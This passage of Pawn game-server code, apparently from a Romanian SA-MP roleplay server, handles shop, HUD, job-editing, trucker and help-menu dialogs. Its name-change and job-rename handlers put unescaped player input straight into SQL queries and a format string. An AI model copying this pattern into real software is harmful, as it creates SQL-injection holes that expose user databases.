		    if(!response) return ShowPlayerDialog(playerid, DIALOG_NEWNUMBER, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti achizitonezi un iPhone (3 cifre, bonus VIP Plus)\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un numar format din 3 cifre.", "Select", "");
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `PhoneNr`='%d' LIMIT 1", strval(inputtext));
			mysql_tquery(SQL, gQuery, "sql_new_phone", "ii", playerid, strval(inputtext));
		}
		case DIALOG_CHANGENAME: {
			if(!forcenamechange[playerid]) {
				if(!response) return ShowShop(playerid);
				if(PlayerInfo[playerid][pPremiumPoints] < 200) return SendClientMessage(playerid, -1, "Nu ai suficiente Premium Points!");
				if(strlen(inputtext) < 2 || strlen(inputtext) > 20) {
					SendClientMessage(playerid, COLOR_GREY, "Numele trebuie sa aiba intre 3 si 20 caractere.");
					ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Shop:", "Esti pe cale sa-ti creezi schimbi numele}.\nTot ce trebuie sa faci in acest moment, este sa-ti alegi un nume care nu este luat de altcineva.\nLimita este de 3 si 20 caractere.", "Ok", "Back");
					return true;
				}	
			} else {
				if(!response) return ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Force change name:", "Please enter your desired name below:", "Ok", "Cancel");	
				if(strlen(inputtext) < 2 || strlen(inputtext) > 20) {
					SendClientMessage(playerid, COLOR_GREY, "Numele trebuie sa aiba intre 3 si 20 caractere.");
					ShowPlayerDialog(playerid, DIALOG_CHANGENAME, DIALOG_STYLE_INPUT, "Force change name:", "Please enter your desired name below:", "Ok", "Cancel");	
					return true;
				}
			}
			mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `name` = '%s' LIMIT 1", inputtext);
			mysql_tquery(SQL, gQuery, "sql_cache_name_rows", "is", playerid, inputtext);
		}
		case DIALOG_SHOW: {
			if(!response) return true;
			new szDialog[512];
			for(new i = 0; i < 12; i++) format(szDialog, sizeof(szDialog), "%s%s\n", szDialog, HudName[i]);
			switch(listitem) {
			    case 0: {
					if(PlayerInfo[playerid][pShowJob] == 0) {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Job Info was updated. New status is {0AC917}Enabled{FFADAD}.");
					    PlayerInfo[playerid][pShowJob] = 1;
					}
					else {
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) Job Info was updated. New status is {FF0000}Disable{FFADAD}.");
					    PlayerInfo[playerid][pShowJob] = 0;
					    if(JobWorking[playerid] == 1) PlayerTextDrawHide(playerid, JobTD);
					}
					UpdateVar(playerid, "ShowJob", PlayerInfo[playerid][pShowJob]);
				}
				case 1: {
					PlayerInfo[playerid][pShowCeas] = !PlayerInfo[playerid][pShowCeas];
					SendClientMessage(playerid, 0xFFADADFF, PlayerInfo[playerid][pShowCeas] ? "(HUD) Time played was updated. New status is {0AC917}Enabled{FFADAD}." : "(HUD) Time played was updated. New status is {FF0000}Disable{FFADAD}.");
					UpdateVar(playerid, "ShowCeas", PlayerInfo[playerid][pShowCeas]);
					PlayerTextDrawSetString(playerid, CeasPTD, "~y~--:-- (-.--)");
					if(PlayerInfo[playerid][pShowCeas]) PlayerTextDrawShow(playerid, CeasPTD), TextDrawShowForPlayer(playerid, CeasTD);
					else PlayerTextDrawHide(playerid, CeasPTD), TextDrawHideForPlayer(playerid, CeasTD);
					return true;
				}
			    case 2: {
					if(PlayerInfo[playerid][pShowFP] == 0) {
                        PlayerInfo[playerid][pShowFP] = 1;
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) FPS and Ping was updated. New status is {0AC917}Enabled{FFADAD}.");
						PlayerTextDrawShow(playerid, ShowFPS);
						PlayerTextDrawSetString(playerid, ShowFPS, "---");
					}
					else {
						PlayerInfo[playerid][pShowFP] = 0;
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) FPS and Ping was updated. New status is {FF0000}Disable{FFADAD}.");
						PlayerTextDrawHide(playerid, ShowFPS);
					}
					UpdateVar(playerid, "ShowFP", PlayerInfo[playerid][pShowFP]);
			    }
				case 3: SelectedHud[playerid] = 0, ShowPlayerDialog(playerid, DIALOG_HUDSELECT,DIALOG_STYLE_LIST,"{F4AD42}HUD {FFFFFF}Menu:",szDialog,"Select","Cancel");
				case 4: SelectedHud[playerid] = 1, ShowPlayerDialog(playerid, DIALOG_HUDSELECT,DIALOG_STYLE_LIST,"{F4AD42}HUD {FFFFFF}Menu:",szDialog,"Select","Cancel"); 			
				case 5: {
					if(PlayerInfo[playerid][pShowDMG] == 0) {
						PlayerInfo[playerid][pShowDMG] = 1;
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) Damage Informer was updated. New status is {0AC917}Enabled{FFADAD}.");
					}
					else {
					    PlayerInfo[playerid][pShowDMG] = 0;
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) Damage Informer was updated. New status is {FF0000}Disable{FFADAD}.");
					}
					UpdateVar(playerid, "ShowDMG", PlayerInfo[playerid][pShowDMG]);
			    }				
                case 6: {
					if(PlayerInfo[playerid][pShowBanca] == 0) {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Bank Money Textdraw was updated. New status is {0AC917}Enabled{FFADAD}.");
					    PlayerInfo[playerid][pShowBanca] = 1;
					    format(string, sizeof(string), "$%s", formatBytes(bank[playerid]));
					    PlayerTextDrawSetString(playerid, BancaTD, string);
					    PlayerTextDrawShow(playerid, BancaTD);					
					}
					else {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Bank Money Textdraw was updated. New status is {FF0000}Disable{FFADAD}.");
					    PlayerInfo[playerid][pShowBanca] = 0;
					    PlayerTextDrawHide(playerid, BancaTD);
					}
					UpdateVar(playerid, "ShowBanca", PlayerInfo[playerid][pShowBanca]);
				}
				case 7: SelectedHud[playerid] = 3, ShowPlayerDialog(playerid, DIALOG_HUDSELECT,DIALOG_STYLE_LIST,"{F4AD42}HUD {FFFFFF}Menu:",szDialog,"Select","Cancel"); 
				case 8: {
					if(!PlayerInfo[playerid][pJob])
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa ai un job!");

					SelectedHud[playerid] = 4, ShowPlayerDialog(playerid, DIALOG_HUDSELECT,DIALOG_STYLE_LIST,"{F4AD42}HUD {FFFFFF}Menu:",szDialog,"Select","Cancel"); 
				}
				case 9: {
					if(PlayerInfo[playerid][pHudGen] == 0) {
						PlayerInfo[playerid][pHudGen] = 1;
						PlayerTextDrawSetString(playerid, SpeedometerPTD[0], "");
						PlayerTextDrawSetString(playerid, SpeedometerPTD[1], "");
						PlayerTextDrawSetString(playerid, SpeedometerPTD[2], "Loading...");
						for(new i=0;i<3;i++) PlayerTextDrawShow(playerid, SpeedometerPTD[i]);
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) Speedomter was updated. New status is {0AC917}Enabled{FFADAD}.");
					}
					else {
					    PlayerInfo[playerid][pHudGen] = 0;
						SendClientMessage(playerid, 0xFFADADFF, "(HUD) Speedomter was updated. New status is {FF0000}Disable{FFADAD}.");
						for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid, SpeedometerPTD[i]);
					}
					UpdateVar(playerid, "HudGen", PlayerInfo[playerid][pHudGen]);
			    }	
				case 10: {
					if(PlayerInfo[playerid][pShowProgress][2] == 0) {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Job Goal was updated. New status is {0AC917}Enabled{FFADAD}.");
					    PlayerInfo[playerid][pShowProgress][2] = 1;			
					   	for(new i = 0; i < 2; i++) TextDrawShowForPlayer(playerid, GoalTD[i]);
					}
					else {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Job Goal was updated. New status is {FF0000}Disable{FFADAD}.");
					    PlayerInfo[playerid][pShowProgress][2] = 0;
					    for(new i = 0; i < 2; i++) TextDrawHideForPlayer(playerid, GoalTD[i]);
					}
					UpdateVar(playerid, "ShowProgress3", PlayerInfo[playerid][pShowProgress][2]);
				}
				case 11: {
					if(PlayerInfo[playerid][pShowProgress][3] == 0) {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Gift Info was updated. New status is {0AC917}Enabled{FFADAD}.");
					    PlayerInfo[playerid][pShowProgress][3] = 1;			
					  	for(new i = 0; i < 2; i++) TextDrawShowForPlayer(playerid, GiftTD[i]);
					}
					else {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Gift Info was updated. New status is {FF0000}Disable{FFADAD}.");
					    PlayerInfo[playerid][pShowProgress][3] = 0;
					    for(new i = 0; i < 2; i++) TextDrawHideForPlayer(playerid, GiftTD[i]);
					}
					UpdateVar(playerid, "ShowProgress4", PlayerInfo[playerid][pShowProgress][3]);
				}
				case 12: {
					if(PlayerInfo[playerid][pShowProgress][4] == 0) {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Daily Collect Info was updated. New status is {0AC917}Enabled{FFADAD}.");
					    PlayerInfo[playerid][pShowProgress][4] = 1;			
					  	for(new i = 0; i < 3; i++) TextDrawShowForPlayer(playerid, CollectTD[i]);
					}
					else {
					    SendClientMessage(playerid, 0xFFADADFF, "(HUD) Daily Collect Info was updated. New status is {FF0000}Disable{FFADAD}.");
					    PlayerInfo[playerid][pShowProgress][4] = 0;
					    for(new i = 0; i < 3; i++) TextDrawHideForPlayer(playerid, CollectTD[i]);
					}
					UpdateVar(playerid, "ShowProgress5", PlayerInfo[playerid][pShowProgress][4]);					
				}
			}
		}
		case DIALOG_HUDSELECT: {
			if(!response) return true;
			switch(SelectedHud[playerid]) {
				case 0: PlayerInfo[playerid][pShowHP] = listitem;
				case 1: PlayerInfo[playerid][pShowAP] = listitem;		
				case 3: {
					switch(listitem) {
				    	case 0: {
				    		SendClientMessage(playerid, 0xFFADADFF, "(HUD) Level Progress was updated. New status is {FF0000}Disable{FFADAD}.");
							if(PlayerInfo[playerid][pShowProgress][0]) {
								PlayerInfo[playerid][pShowProgress][0] = 0;
								DestroyProgress(playerid, 0);
							}
				    	}
				    	default: {
				    		if(!PlayerInfo[playerid][pShowProgress][0]) HudProgress[playerid][0] = CreatePlayerProgressBar(playerid, 513.00, 150.00, 85.50, 2.50, 0x00FF0090, 100.0);
				    		PlayerInfo[playerid][pShowProgress][0] = listitem;
				    		UpdateProgress(playerid, 0);		
							SendClientMessage(playerid, 0xFFADADFF, "(HUD) Level Progress was updated. New status is {0AC917}Enabled{FFADAD}.");
				    	}
				    }
				    UpdateVar(playerid, "ShowProgress1", PlayerInfo[playerid][pShowProgress][0]);
				}
				case 4: {
					switch(listitem) {
				    	case 0: {
				    		SendClientMessage(playerid, 0xFFADADFF, "(HUD) Job Progress was updated. New status is {FF0000}Disable{FFADAD}.");
							if(PlayerInfo[playerid][pShowProgress][1]) {
								PlayerInfo[playerid][pShowProgress][1] = 0;
								DestroyProgress(playerid, 1);
							}
				    	}
				    	default: {
				    		if(!PlayerInfo[playerid][pShowProgress][1]) HudProgress[playerid][1] = CreatePlayerProgressBar(playerid, 513.00, 175.00, 85.50, 2.50, 0x00FF00FF, 100.0);
				    		PlayerInfo[playerid][pShowProgress][1] = listitem;
				    		UpdateProgress(playerid, 1);		
							SendClientMessage(playerid, 0xFFADADFF, "(HUD) Job Progress was updated. New status is {0AC917}Enabled{FFADAD}.");
				    	}
				    }
				    UpdateVar(playerid, "ShowProgress2", PlayerInfo[playerid][pShowProgress][1]);
				}
			}
			_query("UPDATE `users` SET `ShowHP` = '%i', `ShowAP` = '%i' WHERE `id` = '%i'", PlayerInfo[playerid][pShowHP], PlayerInfo[playerid][pShowAP], PlayerInfo[playerid][pSQLID]);		
		}			
		case DIALOG_EDITJOB: {
			if(!response) return true;
			if(PlayerInfo[playerid][pAdmin] < 6) return true;
			switch(listitem) {
				case 0: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Job Name:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 1: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Level:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 2: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Tip:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 3: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Skill 1 Veh:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 4: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Skill 2 Veh:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 5: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Skill 3 Veh:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 6: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Skill 4 Veh:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 7: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Skill 5 Veh:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
				case 8: ShowPlayerDialog(playerid, DIALOG_EDITJOB1, DIALOG_STYLE_INPUT, "Skill 6 Veh:", "Scrie putin mai jos valoarea pe care vrei sa o aiba aceasta variabila.", "Ok", "Close");
			}
			EditJob[playerid] = listitem;
		}
		case DIALOG_EDITJOB1: {
			new
				amount = strval(inputtext),
				job = EditJobID[playerid];

			if(!response) {
				new szDialog[1024];
				if(PlayerInfo[playerid][pAdmin] < 6) 
					return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);
				
				format(szDialog, sizeof(szDialog),
					"Job Name\t\t%s\nLevel\t\t%d\nLegal\t\t%d\n\
					Skilll 1 Veh\t\t%d\nSkill 2 Veh\t\t%d\nSkill 3 Veh\t\t%d\nSkill 4 Veh\t\t%d\nSkill 5 Veh\t\t%d\nSkill 6 Veh\t\t%d",
				JobInfo[job][jName], JobInfo[job][jLevel], JobInfo[job][jLegal], JobInfo[job][jSkill1Veh], JobInfo[job][jSkill2Veh], JobInfo[job][jSkill3Veh], JobInfo[job][jSkill4Veh],
				JobInfo[job][jSkill5Veh], JobInfo[job][jSkill6Veh]);

				gString[0] = EOS;
				format(gString, 128, "Edit job %d", job);
				ShowPlayerDialog(playerid, DIALOG_EDITJOB, DIALOG_STYLE_TABLIST, gString, szDialog, "Select", "Cancel");
				EditJobID[playerid] = job;
				return true;
			}
			if(PlayerInfo[playerid][pAdmin] < 6) 
				return true;

			gString[0] = EOS;
			gQuery[0] = EOS;
			switch(EditJob[playerid]) {
				case 0: {
					format(JobInfo[job][jName], 64, inputtext);

					format(gString, 128, "Ai modificat 'Job Name' la jobul cu ID-ul %d, in: %s.", job, inputtext);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					DestroyDynamic3DTextLabel(JobInfo[job][jLabel]);
					DestroyDynamicPickup(JobInfo[job][jPickup]);

					format(gString, 256, "ID: {018C0D}%d\n{018C0D}%s\n{FFFFFF}Job: {018C0D}%s\n{FFFFFF}Level: {018C0D}%d\n{FFFFFF}Owner: {018C0D}%s\n{FFFFFF}Press {018C0D}Y{FFFFFF} to get job.\nPress {018C0D}N{FFFFFF} to quit job.", job, JobInfo[job][jDescription], JobInfo[job][jName], JobInfo[job][jLevel], JobInfo[job][jOwner]);
					JobInfo[job][jLabel] = CreateDynamic3DTextLabel(gString, 0xFFFFFF00, JobInfo[job][jPosX], JobInfo[job][jPosY], JobInfo[job][jPosZ], 25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, -1, -1, 100.0);
					JobInfo[job][jPickup] = CreateDynamicPickup(1239, 23, JobInfo[job][jPosX], JobInfo[job][jPosY], JobInfo[job][jPosZ], 0, -1, -1, 100.0);
					
					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Name`='%s' WHERE `ID`='%d'", inputtext, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 1: {
					JobInfo[job][jLevel] = amount;
					DestroyDynamic3DTextLabel(JobInfo[job][jLabel]);
					DestroyDynamicPickup(JobInfo[job][jPickup]);

					format(gString, 256, "ID: {018C0D}%d\n{018C0D}%s\n{FFFFFF}Job: {018C0D}%s\n{FFFFFF}Level: {018C0D}%d\n{FFFFFF}Owner: {018C0D}%s\n{FFFFFF}Press {018C0D}Y{FFFFFF} to get job.\nPress {018C0D}N{FFFFFF} to quit job.", job, JobInfo[job][jDescription], JobInfo[job][jName], JobInfo[job][jLevel], JobInfo[job][jOwner]);
					JobInfo[job][jLabel] = CreateDynamic3DTextLabel(gString, 0xFFFFFF00, JobInfo[job][jPosX], JobInfo[job][jPosY], JobInfo[job][jPosZ], 25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, -1, -1, 100.0);
					JobInfo[job][jPickup] = CreateDynamicPickup(1239, 23, JobInfo[job][jPosX], JobInfo[job][jPosY], JobInfo[job][jPosZ], 0, -1, -1, 100.0);
					
					format(gString, 128, "Ai modificat 'Level' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `NeedLevel`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 2: {
					JobInfo[job][jLegal] = amount;

					format(gString, 128, "Ai modificat 'Legal' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Legal`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 3: {
					JobInfo[job][jSkill1Veh] = amount;

					format(gString, 128, "Ai modificat 'Skill1Veh' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Skill1Veh`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 4: {
					JobInfo[job][jSkill2Veh] = amount;

					format(gString, 128, "Ai modificat 'Skill2Veh' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Skill2Veh`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 5: {
					JobInfo[job][jSkill3Veh] = amount;
					format(gString, 128, "Ai modificat 'Skill3Veh' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Skill3Veh`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 6: {
					JobInfo[job][jSkill4Veh] = amount;
					format(gString, 128, "Ai modificat 'Skill4Veh' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Skill4Veh`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 7: {
					JobInfo[job][jSkill5Veh] = amount;
					format(gString, 128, "Ai modificat 'Skill5Veh' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Skill5Veh`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
				case 8: {
					JobInfo[job][jSkill6Veh] = amount;
					format(gString, 128, "Ai modificat 'Skill6Veh' la jobul cu ID-ul %d, in: %d.", job, amount);
					SendClientMessage(playerid, COLOR_WHITE, gString);

					mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `jobs` SET `Skill6Veh`='%d' WHERE `ID`='%d'", amount, job);
					mysql_tquery(SQL, gQuery, "", "");
				}
			}
		}
		case DIALOG_JOBS: {
			if(!response) 
				return true;
			
			if(CP[playerid] != 0) return ShowPlayerDialog(playerid, DIALOG_CHECKPOINT, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Do you want to cancel your current checkpoint?", "Yes", "No");
			
			new j = listitem + 1;

			gString[0] = EOS;
			format(gString, 128, "Ti-a fost pus un checkpoint catre job-ul %s. Distanta: %0.2fm", JobInfo[j][jName], GetPlayerDistanceFromPoint(playerid, JobInfo[j][jPosX], JobInfo[j][jPosY], JobInfo[j][jPosZ]));
			SendClientMessage(playerid, COLOR_YELLOW, gString);

			SetPlayerCheckpoint(playerid, JobInfo[j][jPosX], JobInfo[j][jPosY], JobInfo[j][jPosZ], 1);
			CP[playerid] = PlayerInfo[playerid][pTutorial]!=4?53:69;
			listitemm[playerid] = j;
		}
		case DIALOG_TRUCKER: {
		    if(!response) return stopWork(playerid);
		    if(!JobWorking[playerid]) 
		    	return true;
		
		    if(PlayerInfo[playerid][pJobSkill][PlayerInfo[playerid][pJob]] < listitem+1) {
		    	SCMf(playerid, COLOR_LGREEN, "Eraore: Ai nevoie de skill %d+ pentru aceasta ruta.", listitem+1);
				ShowPlayerDialog(playerid, DIALOG_TRUCKER, DIALOG_STYLE_LIST, "Trucker Job", "Food (skill 1)\nClothes (skill 2)\nMaterials (skill 3)\nExplosible (skill 4)\nGuns (skill 5)\nOres (skill 6)", "Select", "Cancel");
		    	return true;
		    }
	        new Float:pX,Float:pY,Float:pZ,Float:vA;
			GetPlayerPos(playerid,pX,pY,pZ);
			GetVehicleZAngle(GetPlayerVehicleID(playerid),vA);
			switch(listitem) {
				case 0: Trailer[playerid] = CreateVehicleEx(435, pX+6, pY+6, pZ+6, vA, -1, -1);
				case 2: Trailer[playerid] = CreateVehicleEx(591, pX+6, pY+6, pZ+6, vA, -1, -1);
				case 3: {
					Trailer[playerid] = CreateVehicleEx(584, pX+6, pY+6, pZ+6, vA, -1, -1);
					SetVehicleHealth(Trailer[playerid], 500);
				}
				default: Trailer[playerid] = CreateVehicleEx(450, pX+6, pY+6, pZ+6, vA, -1, -1);
			}

			JobTime[playerid] = gettime();
			vehiclePlayerID[Trailer[playerid]] = playerid;
			new rand = random(3);
			while(rand+1==getCityEx(playerid)) rand = random(3);
			truckerRoot[playerid]=(listitem*3)+rand;
			SetPlayerCheckpoint(playerid, gTruckerCP[listitem][rand][0], gTruckerCP[listitem][rand][1], gTruckerCP[listitem][rand][2], 5.0);
			CP[playerid] = 52;
			SCMf(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Distanta pana la locatia aleasa (categorie: %s): %.2fm.", truckerRoute[listitem], GetPlayerDistanceFromPoint(playerid, gTruckerCP[listitem][rand][0], gTruckerCP[listitem][rand][1], gTruckerCP[listitem][rand][2]));
			UpdateJobStats(playerid);
		}
		case DIALOG_HELP: {
			if(!response) return true;
			gString[0] = (EOS);
			switch(listitem) {
				case 0: return ShowPlayerDialog(playerid, DIALOG_BACK, DIALOG_STYLE_MSGBOX, "Help", "Account Commands\n\n/stats - verifici statisticile tale.\n/changepass - iti schimbi parola.\n/id - verifici ID-ul unui jucator.\n/licenses - verifici licentele detinute.\n/buylevel - iti cumperi nivel (daca ai punctele necesare).\n/time - verifici cat timp ai jucat de la ultimul Payday primit.", "Back", "Cancel");
				case 1: {
					strcat(gString, "Genneral Commands\n\n");
					strcat(gString, "/report - poti raporta o problema.\n");
					strcat(gString, "/newbie - poti pune o intrebare.\n");
					strcat(gString, "/pay - dai bani unui jucator aflat langa tine.\n");
					strcat(gString, "/buy - cumperi iteme din 24/7.\n");
					strcat(gString, "/drink - cumperi bautura dintr-un bar.\n");
					strcat(gString, "/showlicenses - arati licentele unui jucator.\n");
					strcat(gString, "/accept - accepti o invitatie/lucru.\n");
					strcat(gString, "/cancel - refuzi o invitatie/lucru.\n");
					strcat(gString, "/service - apelezi la un serviciu.\n");
					strcat(gString, "/eject - dai un player afara din vehicul.\n");
					strcat(gString, "/fill - faci plinu'.\n");
					strcat(gString, "/tog - dezactivezi/activezi anumite actiuni.");
				}
				case 2: {
					strcat(gString, "Chat Commands\n\n");
					strcat(gString, "/whisper - soptesti unui playeri aflat langa tine.\n");
					strcat(gString, "/shout - strigi.\n");
					strcat(gString, "/ad - pui un anunt.\n");
					strcat(gString, "/f - chatul factiunii.\n");
					strcat(gString, "/c - chatul clanului.\n");
				}
				case 3: {
					strcat(gString, "Bank Commands\n\n");
					strcat(gString, "/balance - vezi balanta contului tau.\n");
					strcat(gString, "/withdraw - scoti o suma de bani din contul tau bancar.\n");
					strcat(gString, "/withdrawm - scoti o suma de bani din contul tau bancar de miliarde daca detii gradul de VIP Plus.\n");
					strcat(gString, "/deposit - pui o suma de bani in contul tau bancar.\n");
					strcat(gString, "/depositm - pui o suma de bani in contul tau bancar de miliarde daca detii gradul de VIP Plus.\n");
				}
				case 4: {
					strcat(gString, "Vehicle Commands\n\n");
					strcat(gString, "/v - administrezi vehiculele personale.\n");
					strcat(gString, "/swapcolors - schimbi culorile intre ele.\n");
					strcat(gString, "/carplate - pui un numar de inmatriculare.\n");
					strcat(gString, "/park - parchezi vehiculul.\n");
					strcat(gString, "/carcolor - setezi culorile unui vehicul.\n");
					strcat(gString, "/lock (sau tasta N) - inchizi/deschizi vehiculul.\n");
					strcat(gString, "/towcar - poti respawna un vehicul personal intr-un mod mai usor.\n");
					strcat(gString, "/findcar - poti localiza un vehicul personal intr-un mod mai usor.\n");										
				}
				case 5: {
					strcat(gString, "House Commands\n\n");
					strcat(gString, "/housemenu - meniul casei");
					strcat(gString, "/heal - iei viata din casa.\n");
					strcat(gString, "/sellhousetostate - vinzi casa la stat.\n");			
				}
				case 6: {
					strcat(gString, "Business Commands\n\n");
					strcat(gString, "/bizmenu - meniu biz/sellbiztostate - vinzi afacerea la stat.");
				}
				case 7: {
					if(!PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,COLOR_WHITE, "* Nu faci parte dintr-o factiune.");
					switch(PlayerInfo[playerid][pMember]) {
						case 1,2,3,14,19: {
							strcat(gString, "Faction PD Commands\n\n");
							strcat(gString, "/duty - te pui la datorie / iesi.\n");
							strcat(gString, "/mdc - verifica informatiile infractorului.\n");
							strcat(gString, "/su - dai wanted unui suspect.\n");
							strcat(gString, "/so - somezi un suspect.\n");
							strcat(gString, "/arrest - arestezi un suspect.\n");
							strcat(gString, "/tazer - blochezi un suspect.\n");
							strcat(gString, "/cuff - incatusezi un suspect.\n");
							strcat(gString, "/untie - dezlegi un player.\n");
							strcat(gString, "/uncuff - dezcatusezi un suspect.\n");
							strcat(gString, "/frisk - verifici suspectul de lucruri ilegale.\n");
							strcat(gString, "/clear - stergi wanted-ul unui player.\n");
							strcat(gString, "/d - chat intre departament.\n");
							strcat(gString, "/r - chat intre membri.\n");
							strcat(gString, "/wanted - vezi jucatorii ce au wanted.\n");
							if(PlayerInfo[playerid][pMember] == 1) strcat(gString, "/ticket - dai amenda unui suspect.\n");
							strcat(gString, "/confiscate - confisti un lucruri.\n");
							if(PlayerInfo[playerid][pMember] == 3) strcat(gString, "/punish - blochezi un player pentru un anumit timp.\n");
						}
						case 4,5,6,10,17,18,25,26,27: {
							strcat(gString, "Faction Mafii Commands\n\n");
							strcat(gString, "/order - cumperi arme din HQ.\n");
							strcat(gString, "/attack - ataci un teritoriu.\n");
							strcat(gString, "/tie - legi un player.\n");
							strcat(gString, "/untie - dezlegi un player.\n");
							strcat(gString, "/stealers - lista cu cei ce au furat un vehicul al factiunii\n");			
						}
						case 7,16,21: {
							strcat(gString, "Faction School Instructor Commands\n\n");
							strcat(gString, "/startlesson - incepi o lectie.\n");
							strcat(gString, "/stoplesson - opresti lectia.\n");	
							strcat(gString, "/givelicense - dai licenta unui player.\n");												
						}					
						case 8,22: {
							strcat(gString, "Faction Tow Truck Company Commands\n\n");
							strcat(gString, "/tow - tractezi un vehicul.\n");
						}
						case 9: {
							strcat(gString, "Faction News Reporters Commands\n\n");
							strcat(gString, "/news - dai anunturi.\n");
							strcat(gString, "/live - faci live cu un jucator.\n");
							strcat(gString, "/endlive - inchizi un live.\n");					
						}
						case 11: {
							strcat(gString, "Faction Hitman Commands\n\n");
							strcat(gString, "/mycontract - vezi contractul tau.\n");
							strcat(gString, "/order - cumperi arme.\n");
							strcat(gString, "/gethit - iei un contract.\n");
							strcat(gString, "/leavehit - anulezi un contract.\n");
							strcat(gString, "/contracts - vezi contractele disponibile.\n");
							strcat(gString, "/undercover - te pui sub acoperire/iesi.\n");
						}
						case 12,15,23: {
							strcat(gString, "Faction Taxi Commands\n\n");
							strcat(gString, "/fare - setezi tariful.\n");
							strcat(gString, "/accept taxi - accepti o comanda.\n");
						}
						case 13,20: {
							strcat(gString, "Faction Paramedic Commands\n\n");
							strcat(gString, "/heal - dai viata unui jucator.\n");
							strcat(gString, "/d - chat intre departament.\n");
							strcat(gString, "/r - chat intre membri.\n");						
						}	     		    
					}
					if(PlayerInfo[playerid][pMember]!=1&&PlayerInfo[playerid][pMember]!=2&&PlayerInfo[playerid][pMember]!=3&&PlayerInfo[playerid][pMember]!=14) strcat(gString, "/f - chatul factiunii.\n");	
